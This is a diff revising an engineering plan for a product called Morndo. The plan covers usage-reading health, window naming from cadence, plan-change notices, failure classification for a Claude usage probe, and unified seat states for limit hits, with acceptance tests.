@@ -1,6 +1,6 @@
 # Usage detection that catches limits for every user: plan
 
-**Phase: plan only.** No code, no pull request. Board T-414, 2026-10-23. Builds on [ADR-0016](../adr/0016-home-usage-across-accounts.md) (Usage, U1 to U5), [ADR-0029](../adr/0029-account-pool.md) (the pool's seats) and [ADR-0034](../adr/0034-account-labels.md) (labels). A short ADR draft is [ADR-0036](../adr/0036-usage-reading-health.md).
+**Phase: plan only.** No code, no pull request. Board T-414, 2026-10-23; revised after review round 1 (the same day). Builds on [ADR-0016](../adr/0016-home-usage-across-accounts.md) (Usage, U1 to U5), [ADR-0029](../adr/0029-account-pool.md) (the pool's seats) and [ADR-0034](../adr/0034-account-labels.md) (labels). A short ADR draft is [ADR-0036](../adr/0036-usage-reading-health.md).
 
 Facts carry a citation. `path:line` is this repository at `4a0274cf` (main, 2026-10-23). `pool-script:N` is the pool script a user may run beside Morndo (`claude-pool`, outside this repository, lines read 2026-10-23); `cursor-collector` and `zai-collector` are the two usage collectors that post to Home from outside the repository. The Cursor collector was being edited the same day, so it is cited by function. **INFERENCE** marks a conclusion drawn from evidence; **UNVERIFIED** marks what no source or run settled. Account names below are made up (`seat-a`, `seat-b`, `seat-c`).
 
@@ -10,22 +10,23 @@ Facts carry a citation. `path:line` is this repository at `4a0274cf` (main, 2026
 
 **The problem in one paragraph.** Home shows numbers it was once told and cannot say when they stopped being true. A usage reader that fails (a screen it does not know, a plan that ended, a sign-in that was refused) posts nothing, so Home keeps the last figures with no sign of age (`packages/domain/src/usage.ts:44`, `:148-154`; `apps/web/src/lib/desktop/HomeView.svelte:79`). Window names are chosen by whoever wrote the reader, so a plan that changes cadence is mislabelled until a person notices. A limit hit is handled by three separate code paths that never meet. None of this is special to one machine: any user who connects an account that changes plan, loses its sign-in or hits a limit meets the same silence.
 
-**Why the Claude probe read "no usage on screen" in 78% of probes (524 of 674, 10-15 21:00 to 10-20 00:00).** It is not a screen-format problem. 524 = 186 + 199 + 139 failures from **three seats** that had stopped being usable (two later refused by their organization, one lapsed). The three other seats probed in those hours read cleanly (128 reads, 0 failures; same binary, same parser). The probe writes the same line for every cause (`pool-script:872-874`), and it retries a logged-in seat with no live lane every 20 minutes for as long as that lasts (`pool-script:893-894`), so three dead seats outvote four healthy ones. The state they hid surfaced only when a lane's turn failed: 76 h, 118 h and 109 h after each seat's first failed probe (§3.4). What the screen showed on those probes is **UNVERIFIED**: the probe keeps no screen. Fix: classify the failure, keep one redacted screen per class, back off, and tell Home (§4.4). Explained, not a parser bug.
+**The Claude probe's "no usage on screen" in 78% of probes (524 of 674, 10-15 21:00 to 10-20 00:00): a hypothesis with evidence, not a settled cause.** *Evidence (from the log and the script):* the 524 are 139 + 186 + 199 failures from **three seats**, each an unbroken streak that began on a different day, after that seat had read fine; each seat was later marked by a failed lane turn (two refused by their organization, one lapsed). The three other seats probed in those hours read 128 times with 0 failures (same binary, same parser). The probe writes the same line for every cause (`pool-script:872-874`) and retries a logged-in seat with no live lane every 20 minutes (`pool-script:893-894`), so three bad seats outvote the healthy ones. *Hypothesis:* the failures are the seats' state (refused, lapsed), shown by the CLI as a screen without the usage block. *Not shown:* what any of those screens said; the probe keeps none. A tier-specific layout and a transient service fault fit the evidence worse (§3.4) but are not excluded until a screen is captured. The plan does not depend on the answer: it classifies every failure, keeps one redacted screen per class, backs off, and tells Home (§4.4), which also settles the question.
 
 **Three options. One tap each.**
 
 | | Option | What it buys | Cost (INFERENCE, in lane-days) |
 |---|---|---|---|
-| **1 (recommended)** | **Readings that tell the truth.** A reading has a health (reading, aged, can't read since X), a window is named from its own length or reset distance, a plan change is told once, and a limit hit from any lane or the manager sets one seat state with a back-at time and one notice with the fix. | All five gaps, each in its smallest form (§5). Works for any user's collectors and any account that posts. | 4 pull requests, about 2 to 3 days, plus a patch brief for the operator's own pool script (outside this repository). |
-| 2 | **Labels and staleness only.** Gaps 1 and 3: names from length, "can't read since X". | Home stops showing old numbers as current and stops mislabelling a changed plan. Does not explain or reduce the probe failures, does not unify limit hits, no notices. | 2 pull requests, about 1 day. |
+| **1 (recommended)** | **Readings that tell the truth.** A reading has a health (reading, aged, can't read since X), a window is named from its own length or reset distance, a plan change is told once, and a limit hit from any lane or the manager sets one seat state with a back-at time and one notice with the fix. | All five gaps, each in its smallest form (§5). Works for any user's collectors and any account that posts. | 5 pull requests, about 4 to 5 days (account resolution, the fleet consumer, cadence storage, notices, Home with its e2e), plus a patch brief for the operator's own pool script (outside this repository, about 1 day, owner OK needed for the screen capture). |
+| 2 | **Labels and staleness only.** Gaps 1 and 3: names from length, "can't read since X". | Home stops showing old numbers as current and stops mislabelling a changed plan. Does not explain or reduce the probe failures, does not unify limit hits, no notices. | 2 pull requests, about 1.5 days (cadence storage needs a migration). |
 | 3 | **Option 1 plus Claude in Morndo's pool** (the product team's proposal B). | Claude accounts leave the outside pool script; usage comes from the status line, not a screen probe. | 8 or more pull requests, 1 to 2 weeks, a terms review, and a phone-side sign-in nobody has verified. Not recommended before Option 1 has shipped. |
 
-Recommended: **Option 1.** Tap "Go: option 1" and the manager files the four slices of §5 with the acceptance tests named there. Option 3 stays open and is easier after Option 1, because the seat state and the reading health it needs are built there.
+Recommended: **Option 1.** Tap "Go: option 1" and the manager files the five slices of §5 with the acceptance tests named there. Option 3 stays open and is easier after Option 1, because the seat state and the reading health it needs are built there.
 
 **Decisions the plan makes by default (undo by saying so):**
 - A reading that cannot be made replaces the meters with "can't read since X" (§4.3); the last figures are not shown beside it.
 - No credential file is read by anything in this repository (§6). Plan names come from what a provider's own CLI or documented API prints.
 - Usage still decides nothing (U4): a seat state is displayed and told, never routed on.
+- Nothing an agent token posts as free text is shown as a remedy. A remedy is one of a closed list of known fixes; any other text a source adds is shown as "the source says", short, plain, with no links (§4.5).
 
 ---
 
@@ -55,6 +56,8 @@ Recommended: **Option 1.** Tap "Go: option 1" and the manager files the four sli
 | F20 | The manager and the studio lane are looped windows. The guard moves them by a restart script, and reports a failed move with a different note than a lane's move. | `pool-script:87`, `:724-731` |
 | F21 | The pool script retires a seat as "lapsed" from the credentials file's non-secret fields (tier, subscription type) and the configured expiry; a lapsed Max plan reads as "ok 100%" until then. | `pool-script:186-203`, `:294-326` |
 | F22 | On this box today, three seats' usage files are 7, 10 and 14 days old, still holding their last numbers, with no sign of age anywhere. | usage files of the pool, mtimes read 2026-10-23 |
+| F23 | The fleet's lane-event consumer drops the manager's own window and any ignored window before it makes an event, so a manager's `stop_failure` produces no lane event at all. A `stop_failure` event has a lane (window) and a node and an `error` of up to 60 characters; it has **no actor and no account**. | `apps/fleet/src/application/lane-events.ts:62`, `:79`, `:150-152` |
+| F24 | A lane started through the fleet carries its account in `lane.start`; the node's launcher takes it as `{account}` and refuses a start that disagrees. A lane started by hand, or moved to another account by a pool script, is not a `lane.start`. | `packages/protocol/src/fleet.ts:161`, `:365`; `apps/node-agent/src/ops/lane-engine.ts:35-38` |
 
 ---
 
@@ -83,7 +86,7 @@ F13 already turns a tier change into "no paid plan" for a label, but silently. F
 
 F1, F2, F7, F16 and F22: a failed read has no path to Home, and an unread account keeps its last figures.
 
-### 3.4 The 78% (gap 4)
+### 3.4 The 78% (gap 4): evidence, then hypotheses
 
 Counted from the pool's `guard.log` (`probe NAME: ...` lines), window 10-15 21:00 to 10-20 00:00 box time:
 
@@ -103,7 +106,16 @@ Each failing run is one unbroken streak per seat, not scattered misses. From eac
 | seat-b | 10-13 17:43 | same error, 10-18 15:21 | 118 h |
 | seat-c | 10-17 01:05 | lapse noticed from the plan's expiry, 10-21 13:49 | 109 h |
 
-Reading: **the probe's failure was the earliest signal of three seat problems and was thrown away.** The classes cannot be told apart from the log, because `probe()` logs one line for all of them (F17). The audit is repeatable (appendix A). On 10-21 the operator added a "lapsed" skip to the probe (F18 `:889`; **INFERENCE** from that day's backup of the script and the last failure at 13:45, which is why seat-c's failures stop then); seat-a and seat-b were probed until they were marked.
+Every seat read fine until its streak began (seat-a until 10-14 17:20, seat-b until 10-13 16:41, seat-c until 10-17 00:04), and the three onsets are days apart. The classes cannot be told apart from the log, because `probe()` logs one line for all of them (F17).
+
+| Hypothesis | Fits | Against | Status |
+|---|---|---|---|
+| **H1** the seat's state changed (refused, lapsed) and the CLI shows no usage block for it | Onset after a good read; each seat later marked by a failed turn or a lapse; the three healthy seats unaffected | Nothing contradicts it; nothing confirms the screen | Leading, **UNVERIFIED** |
+| H2 a layout that differs by plan type (a Team screen against a Max screen) | The parser asks for "Current week (all models)" only (F17) | Each seat read fine before its onset, so its layout did not differ then | Unlikely, not excluded |
+| H3 a transient fault in the service or the CLI | | Three onsets on three days; streaks of days; healthy seats read throughout | Unlikely |
+| H4 the probe's environment (trust dialog, folder) | "claude did not come up" is a separate line (F17) | Same folder and command for every seat | Unlikely |
+
+What settles it: one captured screen head per failing seat (§4.4 step 0), which the owner must allow because it starts the CLI on a seat that is no longer in use. Under H1 the probe's failure was the earliest signal of three seat problems and was thrown away; the timing is **consistent with** that, which is all it shows. The audit is repeatable (appendix A). On 10-21 the operator added a "lapsed" skip to the probe (F18 `:889`; **INFERENCE** from that day's backup of the script and the last failure at 13:45, which is why seat-c's failures stop then); seat-a and seat-b were probed until they were marked.
 
 A second effect (INFERENCE): the status line cannot cover a Team seat. Claude Code documents `rate_limits` for Pro and Max only (F4), and `/usage` for Team too (F5). A Team seat with no live lane therefore depends on the probe, and with the probe failing it has no source at all.
 
@@ -117,10 +129,12 @@ New words (to join `docs/domain.md`'s Usage section):
 |---|---|---|
 | **Source** | A named way an account's figures arrive: `status-line`, `app-server`, `cli-screen`, `vendor-api`. It may declare `every` (how often it will read, in seconds). | A Connection, a runtime. |
 | **Reading health** | Per account and source: `reading` (last read ok and recent), `aged` (ok but older than the source's usual gap), `cannot-read` (a failure was posted, or an expected read did not come). With `since` and a reason class. | A window. |
-| **Reason class** | Why a read failed: `unknown_screen`, `signed_out`, `refused`, `no_usage_for_plan`, `unreachable`, `timeout`, `plan_ended`. A closed list; a source may add free text of 120 characters. | A message to show verbatim. |
+| **Reason class** | Why a read failed: `unknown_screen`, `signed_out`, `refused`, `no_usage_for_plan`, `unreachable`, `timeout`, `plan_ended`. A closed list. | A message to show verbatim. |
+| **Fix** | One of a closed list the hub words itself: `sign_in_again`, `use_another_account`, `wait_for_reset`, `ask_the_org_admin`, `reactivate_the_seat`, `check_the_source`. | Free text, a command, a link. |
+| **Hint** | Optional text a source adds to a failure or a limit. Shown only as "the source says: ...", plain text, 120 characters, no links, never in a push. | A remedy. |
 | **Cadence** | How long a window is, with its basis: `reported` (the source gave minutes), `observed` (two resets seen), `horizon` (only the furthest reset seen), `none`. | A name. |
 | **Plan fact** | The plan name and the set of window ids a source last gave. | An entitlement. |
-| **Seat state** | `ok`, `low`, `out`, `signed-out`, `refused`, `ended`, as the pool's `SeatState` plus `refused`. With `backAt` and `since`. | A routing decision (U4). |
+| **Seat state** | The pool's own `SeatState` (`packages/domain/src/pool.ts:53`): `logged-out`, `retired`, `out`, `low`, `ok`; no new member. With `backAt`, `since` and a `why`: `usage_limit`, `refused`, `signed_out`, `plan_ended`, `billing`, `by_hand`. A refusal or an ended plan is `retired` with that `why`, as the pool retires an unpaid plan (`pool.ts:186-187`). | A routing decision (U4). |
 
 New invariants (U6 onward; U5 is taken by labels):
 
@@ -128,9 +142,10 @@ New invariants (U6 onward; U5 is taken by labels):
 |---|---|
 | U6 | A failed or missing read of a source never leaves that source's windows on show as current. Reading health `cannot-read` removes them from the card and says since when. A later ok read clears it. |
 | U7 | A window's title comes from its cadence: `reported` or `observed` length, else the reset distance. A source cannot set the title. A guessed cadence is shown as "about". |
-| U8 | A plan fact that changes (name, window ids, a window's length) or a used percentage that falls by 20 points or more while its reset is still ahead is a **plan change**. One notice per distinct change; the new fact becomes the baseline. The first fact ever seen is never a change. |
-| U9 | A limit hit, a refused sign-in or a sign-out from any actor (a lane, the manager, a collector, the pool) sets the same seat state for the account. One notice per seat-state change, never per actor. |
-| U10 | A seat state is shown and told, never routed on (U4 stands). |
+| U8 | A plan fact that changes (name, window ids, a window's length) is a **plan change**. So is a used percentage that falls by 20 points or more while the window's reset time is **unchanged** (within a minute) and still ahead, on a window not declared rolling. A window whose reset moves, or that its source declares rolling, falls as old use ages out and is never a change. One notice per distinct change; the new fact becomes the baseline. The first fact ever seen is never a change. |
+| U9 | A limit hit, a refused sign-in or a sign-out, from whatever reports it (a lane's failure, the manager's, a collector, the pool), sets the same seat state for the account the hit is resolved to (§4.5). One notice per seat-state change, never per reporter. A hit that cannot be resolved to an account is kept as `unknown` and changes no seat. |
+| U10 | A seat state is shown and told, never routed on (U4 stands). A remedy shown to the principal is a Fix from the closed list; text from an agent token is a Hint and nothing more. |
+| U11 | A source that is `cannot-read` for 14 days is forgotten, with one last notice. The principal can forget a source or an account at any time; a later ok post starts it afresh (its first fact is not a change, U8). |
 
 ### 4.1 Gap 1: windows named from their own length
 
@@ -152,7 +167,7 @@ New invariants (U6 onward; U5 is taken by labels):
 **Design.** `observePlan(before, after)` is a pure domain function over plan facts (name, window ids with lengths, per-window used percent and reset). It returns zero or more `PlanChange { kind: name | cadence | windows | drop, from, to }`.
 - **name**: both known and different. Sources: Codex `planType` (F6), the Cursor screen header, the pool file's plan (F13, which already reaches the hub every 60 s, so a plan that falls to "no paid plan" is a name change).
 - **cadence / windows**: the set of window ids, or one window's length, differs.
-- **drop**: used percent falls by 20 points or more, and the previous reset is still more than a minute ahead, and the reset time has not moved by a cycle. This catches a provider-side reset and a plan upgrade. The pool script's own "numbers contradict the mark" rule is the same idea (`pool-script:224-262`).
+- **drop**: used percent falls by 20 points or more, **and** the window's reset time is unchanged (within 60 s) and still more than a minute ahead, **and** the source has not declared the window rolling (`rolling: true` on the row; the Z.ai credit windows that "refresh 5 hours after use" are the known case, ADR-0024 [S2]). This catches a provider-side reset and a plan upgrade. A rolling window falls as old turns age out, usually with its reset moving, and must never fire; a fixed window that falls while its reset stays put has been reset or resized. The pool script's own "numbers contradict the mark" rule is the same idea (`pool-script:224-262`). A source that does not say whether its windows roll is treated as fixed only when it also reports a constant reset; the first time a fall comes with a moved reset, the window is marked rolling for the hub's own purposes (cadence storage, §4.1).
 - The hub records the notice signature (account, kind, to-value) in a small table `usage_notices`, so a repeat after a restart tells nobody (the pattern of F10, in the hub).
 - The notice names what changed in words: "seat-b: window changed from 'monthly' to 'weekly, shared with a second product'. Home now shows the weekly window."
 
@@ -163,7 +178,7 @@ New invariants (U6 onward; U5 is taken by labels):
 **Today.** F1, F2, F7, F16, F22.
 
 **Design.**
-1. A new route `POST /api/agent/usage/failure` (agent token, same account header) takes `{ source, reason, detail?, every_s? }`. A collector that meets an unknown screen posts this instead of nothing. Detail is cut to 120 characters, control characters removed, and anything containing an `@` dropped.
+1. A new route `POST /api/agent/usage/failure` (agent token, same account header) takes `{ source, reason, detail?, every_s? }`. A collector that meets an unknown screen posts this instead of nothing. `detail` is a Hint (see the glossary): cut to 120 characters, control characters removed, any address-like text (`@`) and any link dropped, and shown only as "the source says".
 2. Every ok post may carry `X-Morndo-Source` and `X-Morndo-Every` (seconds). The first sets the source (default `status-line`); the second registers that this source will read again by then.
 3. The hub keeps health per (account, source): `lastOkAt`, `lastFailAt`, `reason`, `every`. It computes the state on `view()`:
    - `reading`: last ok within `2 x every`;
@@ -173,16 +188,17 @@ New invariants (U6 onward; U5 is taken by labels):
 4. Defaults a source can rely on: status line none; Codex app-server and the two vendor collectors 15 minutes; a pool screen probe 60 minutes. These are the sources' own declarations, not hub constants, except the 30-minute floor.
 5. Home: the card replaces the meters of a `cannot-read` source with "can't read since 14:05 (screen not recognised)". Other sources of the same account keep their meters. U2's rule about a window a report lacks is unchanged: that is a successful read without the window.
 6. Compatibility: an old collector that never posts a failure and never declares `every` behaves as today.
+7. **Clearing a dead source (U11).** A source `cannot-read` for 14 days is dropped from the card with one last notice ("no reading from X for 14 days; forgotten"). The principal can forget one source or a whole account from Home (`POST /api/usage/forget`, principal session only, never an agent token); the hub keeps no tombstone, so a later post from that source is a new first reading. Without this a retired seat or a removed collector would say "can't read since" for ever.
 
 **Verified by.** AT-9 to AT-12.
 
 ### 4.4 Gap 4: the Claude probe's "no usage on screen"
 
-**Cause.** §3.4: three unusable seats retried forever under one undifferentiated line. Not the parser.
+**Cause (hypothesis H1, §3.4).** Three seats whose state changed, retried every 20 minutes under one undifferentiated line. The evidence does not point at the parser; only a captured screen would prove it.
 
 **Fix (two parts, only the second is in this repository).**
 1. *The operator's pool script* (outside this repository; a separate brief): `probe()` classifies what it sees before it gives up, in the way the Cursor collector already does (`parse_usage_screen` separates "Not logged in", "Failed to load usage data", "not available for this plan", an unknown layout). It keeps **one redacted screen head (40 lines, addresses masked) per seat per class** next to the log; backs off a failing seat (20 min, 1 h, 6 h, then daily) instead of every 20 minutes; checks `claude auth status` (documented: JSON, exit code 1 when signed out) to separate `signed_out` from the rest; and posts the class as a failure to Home (§4.3). Step 0 of the brief is to capture the missing evidence: the screen text for each failing class. Until then the mapping from screen to class is **UNVERIFIED** and AT-13 uses synthetic screens labelled as such.
-2. *This repository*: the reason classes and the failure route of §4.3, and a seat state (§4.5) so a `refused` or `signed_out` class becomes "seat-a is refused by its organization; sign in with another account" the day it starts, not 76 h later.
+2. *This repository*: the reason classes and the failure route of §4.3, and a seat state (§4.5) so a `refused` or `signed_out` class becomes "seat-a is refused by its organization. Fix: use another account" the day it starts, not 76 h later. If H1 is wrong, the classes will say `unknown_screen` with the captured screen head, and the plan has found out cheaply.
 
 **Live accounts the probe skips (F18).** An account with an idle live lane has no status-line post and no probe. Under §4.3 the status line carries no `every`, so it is only `aged`. Where a Claude status line has `refreshInterval` (https://code.claude.com/docs/en/statusline, read 2026-10-23), re-running the script on a timer does not help: the data it receives updates only after a response. The honest answer is the age label. Probing a live seat's account from outside its session is not proposed (it would start a second client on a subscription that has a running one).
 
@@ -190,32 +206,39 @@ New invariants (U6 onward; U5 is taken by labels):
 
 **Verified by.** AT-13, AT-14, and the audit of appendix A re-run after the pool-script patch: every failing probe line carries a class; no seat is probed more than once an hour after three failures.
 
-### 4.5 Gap 5: one seat state for a limit hit from any actor
+### 4.5 Gap 5: one seat state for a limit hit from any reporter
 
-**Today.** Three paths that never meet: the failure hook marks the pool script's own files (F19); the hub receives `stop_failure` and does nothing with it (F12); the Codex pool marks its own domain (F11). The manager is moved by a different script than a lane, with a different note (F20). **UNVERIFIED:** whether the manager's failure reaches the fleet hook identically to a lane's; the plan does not depend on it, because the account is the key (below).
+**Today.** Three paths that never meet: the failure hook marks the pool script's own files (F19); the hub receives `stop_failure` and does nothing with it (F12); the Codex pool marks its own domain (F11). The manager is moved by a different script than a lane, with a different note (F20), and **its failures do not become lane events at all** (F23), so a consumer placed after that filter would never see them.
 
 **Design.**
-1. `UsageService.noteLimit({ account, kind, backAt?, by, at, fix? })`, where `kind` is `usage_limit`, `refused`, `signed_out`, `billing`, `unknown`. One route, `POST /api/agent/usage/limit`, for collectors, the Codex pool and the hook, and one in-process call from the fleet's `stop_failure` consumer. `by` is a label (lane name, `manager`, `pool`, a collector); it is stored for the notice but does not change the outcome.
-2. The account of a `stop_failure` comes from the lane's own `MORNDO_ACCOUNT` header, else from the account that has the failing session among its fresh sessions (`packages/domain/src/usage.ts:11`, `:122-124`, 10-minute freshness). If neither exists the event is kept as `unknown` with no seat change.
-3. Seat state precedence is the pool's (`packages/domain/src/pool.ts:263-283`): signed-out, then ended or refused, then out, then low, then ok. `out` ends at `backAt` (the failure's reset if it names one, else 60 minutes, never more than 168 hours: the pool's own marks, F8). `low` comes from readings at 90% and above, the notice level already used (`usage.ts:36-39`). A fresh ok reading with at least 25 points left in every window clears a mark made before it (the pool does this already, `pool-script:224-262`, and `packages/domain/src/pool.ts:189-194`).
-4. A seat-state change produces exactly one notice with: the account, the state, the back-at time, who hit it, and the fix. The fix is a string the source supplies (`fix`, 120 characters), for example the pool script's undo command; with none, a generic sentence. The hub never invents a command.
-5. The Codex path posts its seat states through the same route from the collector that already lists them (`morndo-keys pool list --json`, used by the Codex collector), so a Codex and a Claude seat share one Home row.
-6. Notices go to Home's notice area and, as a count-only push, through the existing notification service (`apps/hub/src/application/notification-service.ts:30`, `apps/hub/src/main.ts:290-296`). A new `NotificationKind` for usage is a domain addition in slice 2.
+1. `UsageService.noteLimit({ account, kind, backAt?, by, at, fix?, hint? })`, where `kind` is `usage_limit`, `refused`, `signed_out`, `billing`, `unknown`. One route, `POST /api/agent/usage/limit`, for collectors, the Codex pool and the hook, and one in-process call from the fleet. `by` is a label (a lane name, `manager`, `pool`, a collector) stored for the notice; it does not change the outcome. A `stop_failure` has no actor (F23), so `by` there is the lane's name.
+2. **The fleet tap.** The fleet's lane-event intake gets a limit tap that reads `/hook/failure` events **before** the manager and ignore filters (`lane-events.ts:62`), the way it already gives a Run the manager's turn end (`lane-events.ts:150-152`). It stores nothing new in the lane events; it calls `noteLimit`. A failure whose `error` is not one of the known limit kinds is ignored.
+3. **Resolving the account (the first-turn case).** A first-turn failure has no status-line session yet and no `MORNDO_ACCOUNT` header, and `oauth_org_not_allowed` is exactly that failure. So the account is resolved in this order, and the order is tested (AT-19 to AT-21):
+   1. the `account` field of the failure hook's own body: the documented hook script reads the failing process's own config directory name, as the pool's hook does (F19: it takes the basename of `CLAUDE_CONFIG_DIR`), and sends it. It is the most reliable source because the failing process knows its own account;
+   2. the **lane record**: `lane_accounts (node, lane, account, at)` in the hub, written when the hub issues `lane.start` with an `account` (the issuing call is `apps/hub/src/console/lanes.ts:343`; F24), and refreshed by every status-line report (a report names its lane and account, `packages/domain/src/usage.ts:11`, `:122-124`);
+   3. else the account whose fresh sessions (10 minutes, `usage.ts:34`) include the failing session;
+   4. else `unknown`: kept, no seat change (U9).
+   A lane started by hand, or moved to another account by a pool script (not a `lane.start`, F24), has no record or a stale one until its next status-line report; step 1 covers it, and where the hook does not send the field the first failure after such a move stays `unknown` (R7).
+4. Seat state precedence is the pool's (`packages/domain/src/pool.ts:263-283`): `logged-out`, then `retired`, then `out`, then `low`, then `ok`. `out` ends at `backAt` (the failure's reset if it names one, else 60 minutes, never more than 168 hours: the pool's own marks, F8). `low` comes from readings at 90% and above, the notice level already used (`usage.ts:36-39`). A fresh ok reading with at least 25 points left in every window clears a mark made before it (the pool does this already, `pool-script:224-262`, and `packages/domain/src/pool.ts:189-194`).
+5. A seat-state change produces exactly one notice with: the account, the state and its `why`, the back-at time, who hit it, and the Fix. **The Fix is one of the closed list in the glossary**, chosen by the hub from the state and `why` (`refused` gives `use_another_account` or `ask_the_org_admin`, `logged-out` gives `sign_in_again`, `out` gives `wait_for_reset`), or sent by the source as a Fix **name**, which the hub words. The hub never shows a command or any sentence an agent token wrote as a remedy. A source's `hint` appears only as "the source says: ...", plain text, 120 characters, no links, and never in a push (shared per-node worker tokens can post it, so it is treated as untrusted).
+6. The Codex path posts its seat states through the same route from the collector that already lists them (`morndo-keys pool list --json`, used by the Codex collector), so a Codex and a Claude seat share one Home row.
+7. Notices go to Home's notice area and, as a count-only push, through the existing notification service (`apps/hub/src/application/notification-service.ts:30`, `apps/hub/src/main.ts:290-296`). A new `NotificationKind` for usage is a domain addition in slice 2.
 
-**Verified by.** AT-15 to AT-18.
+**Verified by.** AT-15 to AT-22.
 
 ---
 
 ## 5. The smallest v1, and its acceptance tests
 
-Four pull requests, in order. Each is green on its own and leaves Home working.
+Five pull requests, in order. Each is green on its own and leaves Home working.
 
 | Slice | Contents | Done when |
 |---|---|---|
-| **S1 domain and protocol** | `windowTitle`, cadence inference, `ReadingHealth` as a pure function of facts, `observePlan`, seat-state precedence, U6 to U10 in `docs/domain.md`; wire: optional `length_mins`, failure body, limit body, source headers. | AT-1 to AT-8, AT-15 (domain side) |
-| **S2 hub** | `usage_notices` and health tables (one migration), the two routes, the `stop_failure` consumer, the silence sweep, notices to the notice area. | AT-9, AT-10, AT-11, AT-15 to AT-18 |
-| **S3 Home** | "can't read since X", titles from cadence, seat state and back-at on the card. | AT-12 and the Home e2e |
-| **S4 collector contract and docs** | `docs/agents/usage.md` gains the source/failure/limit contract and the reason classes. The Codex collector posts seat states; its reader sends `length_mins`. | AT-14 |
+| **S1 domain and protocol** | `windowTitle`, cadence inference, `ReadingHealth` as a pure function of facts, `observePlan` with the rolling rule, seat-state precedence on the pool's `SeatState`, Fix enum and Hint, U6 to U11 in `docs/domain.md`; wire: optional `length_mins` and `rolling`, failure body, limit body, source headers. | AT-1 to AT-7, AT-13, AT-22 (domain side) |
+| **S2 hub storage and routes** | One migration: health, notices, cadence observations (furthest reset distance and cycle per window), `lane_accounts`. The failure, limit and forget routes, the silence sweep and the 14-day forgetting, notices to the notice area. | AT-8 to AT-11, AT-16, AT-18, AT-23, AT-24 |
+| **S3 fleet tap and account resolution** | The `/hook/failure` tap before the manager filter; `lane_accounts` written at `lane.start` and from reports; the documented failure hook sends the account; the resolution order. | AT-15, AT-17, AT-19 to AT-21 |
+| **S4 Home** | "can't read since X", titles from cadence, seat state, back-at and Fix on the card, "forget this source", the e2e. | AT-12 and the manual QA |
+| **S5 collector contract and docs** | `docs/agents/usage.md` gains the source/failure/limit contract, the reason classes and the Fix names. The Codex collector posts seat states; its reader sends `length_mins`. | AT-14 |
 
 **Not in v1:** the lanes waiting on a seat (proposal A's third item), a usage history, any routing on usage, any change to the pool script (a separate brief), a Claude runtime in the pool.
 
@@ -229,7 +252,7 @@ Acceptance tests. Test files are new unless noted; a fake clock is passed as `no
 | AT-4 | same, "horizon only says about" | One report 6 d 20 h before its reset: title "about weekly"; one 25 d before: "about monthly"; no length and no history: "resets in ...", no cadence word. |
 | AT-5 | `packages/domain/test/usage-plan.test.ts` "a changed plan name is one change" | before "Plan X", after "Plan Y": one `name` change; before null: none. |
 | AT-6 | same, "a changed window set or length is a change" | A second window appearing, or 43200 becoming 10080, each one change. |
-| AT-7 | same, "a drop outside a reset is a change; at a reset it is not" | 80% to 20% with the reset 3 d ahead and unchanged: `drop`. 80% to 5% with the reset moved forward a cycle: none. A fall of 19 points: none. |
+| AT-7 | same, "a drop needs the reset unchanged, and a rolling window never drops" | Fixed window, 80% to 20%, reset 3 d ahead and unchanged: `drop`. 80% to 5% with the reset moved forward a cycle: none. A fall of 19 points: none. **Rolling cases that can fail:** a window declared `rolling`, 80% to 45% with the reset constant: none; a window not declared, 80% to 45% with its reset moving 40 minutes later (old use ageing out): none, and the window is remembered as rolling so the next such fall is none too. |
 | AT-8 | `apps/hub/test/usage-notices.test.ts` "tells a change once, across a restart" | The same change posted twice, and again after the service is rebuilt on the same store: one notice. A different change: a second. |
 | AT-9 | `apps/hub/test/usage-health.test.ts` "a posted failure replaces the meters" | After `failure {reason: unknown_screen}`, the account view has `cannot-read since T` and no windows for that source; other sources keep theirs. |
 | AT-10 | same, "a source that declared every goes silent" | `every` 900 s, no post for `max(4 x every, 30 min)`: `cannot-read`; a post clears it. |
@@ -237,14 +260,20 @@ Acceptance tests. Test files are new unless noted; a fake clock is passed as `no
 | AT-12 | `e2e/home.e2e.ts` "shows can't read since, and a title from the cadence" (existing file) | Post a failure and a 7-day window labelled "monthly" with `length_mins` 10080: the card says "can't read since" and "weekly". Screenshot kept. |
 | AT-13 | `packages/domain/test/usage-reason.test.ts` "reason classes are closed" | An unknown reason maps to `unknown_screen`; detail with an `@` is dropped; 120-character cut. Fixtures are synthetic and labelled so until the real screens of §4.4 are captured. |
 | AT-14 | `apps/connections/test/usage-codex.test.ts` (existing) "sends length_mins" | `usageReport` rows carry the window duration; an unknown duration sends `null`, not a failure. |
-| AT-15 | `apps/hub/test/usage-seats.test.ts` "a lane and the manager set the same seat state" | A `stop_failure` `rate_limit` from a lane actor and from the principal actor, in two runs: identical seat state and back-at; one notice each run. |
-| AT-16 | same, "two actors, one change, one notice" | A lane then the manager hit the same account within the mark: one notice. |
-| AT-17 | same, "a refusal is its own state with the fix" | `oauth_org_not_allowed` sets `refused`; the notice carries the source's `fix` string, or the generic sentence when none is given; the hub adds no command of its own. |
+| AT-15 | `apps/hub/test/usage-seats.test.ts` "a lane's failure and a manager's limit post set the same seat state" | A `rate_limit` `stop_failure` for lane `w1` (resolved to account `seat-a`) and, in a second run, `POST /usage/limit` under a manager token for `seat-a` with the same reset: the same `out` state and `backAt`, one notice each run. (A `stop_failure` has no actor; the second path is the manager's own door.) |
+| AT-16 | same, "two reporters, one change, one notice" | A lane's failure then a manager post for the same account within the mark: one notice. |
+| AT-17 | same, "a refusal is `retired` with why `refused`, and the Fix is from the list" | `oauth_org_not_allowed` sets `retired`/`refused`; the notice says `use_another_account` in the hub's own words; no command appears. |
 | AT-18 | same, "a fresh reading clears a mark made before it" | `out` until 18:00; at 15:00 a reading with 40 points left in both windows: `ok`, one "back" notice. |
+| AT-19 | `apps/hub/test/usage-account-resolution.test.ts` "a first-turn failure resolves from the lane record" | Lane `w1` started by the hub with account `seat-a`; no status-line report, no header, no hook field; `oauth_org_not_allowed` arrives: the seat is `retired`/`refused` for `seat-a`. Without the record (negative control) the result is `unknown` and no seat changes. |
+| AT-20 | same, "a moved lane with a stale record resolves from the hook's own field" | Record says `seat-a`; the lane was moved to `seat-b` by a pool script; the failure's body carries `account: seat-b`: the seat marked is `seat-b`, not `seat-a`. With no field, the result is `unknown`, and the next status-line report corrects the record. |
+| AT-21 | `apps/fleet/test/lane-events.test.ts` (existing) "the manager's failure reaches the limit tap but makes no lane event" | A `/hook/failure` for the manager's window: `take` stores no event (as today) and `noteLimit` is called once; an ignored window likewise; an unknown error kind calls nothing. |
